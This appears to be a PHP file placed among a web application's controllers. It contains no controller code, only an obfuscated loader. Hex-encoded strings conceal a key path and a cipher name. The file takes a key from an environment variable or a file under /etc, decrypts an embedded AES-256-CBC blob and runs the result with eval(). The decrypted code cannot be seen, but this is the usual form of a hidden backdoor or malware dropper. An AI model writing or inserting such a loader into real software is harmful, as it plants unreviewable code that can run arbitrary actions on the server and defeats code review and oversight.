<?php
namespace App\Http\Controllers;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('RdU4YDLrGuh2LO65hRcdKw==');

$c=base64_decode(

'A78UJQFpGnGkDK+OXmEYMqCT9rwsogEnTLg6x2kK3qyRAAN/+Few8fx+INgDvZ3opUMmazykcHCw' .
'lUDTGna5zbxhzgV/QCKOba+4E6Q7ElkADS4HkRyfPMCmNOAenGj0j4IB8hnv9dKNZyuUJDMCTiFD' .
'ocBa15Rqa/Upzk/8kzdXU+fmI4NlgdnbnBf6JxgISdpUqxV1cTnPdNSFeeg/GdeTLqrC8BN8Ub50' .
'7fcJfJlyX2euSpNTI5BcsiUnBWp7Cg/SeuJHQYqoCt++YHZp6XhXZ/SAFOQnfdH//6+/ohHkRfRX' .
'aq23tbMdPfyujPGcDPIjccRIxWfziWm2q+RQR7RCjlK351pbcnpTqJi7HdMjmCb0fGPXQ2sLDsj4' .
'T/QrgXMF2rIqe9oJltwju5HLFg=='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

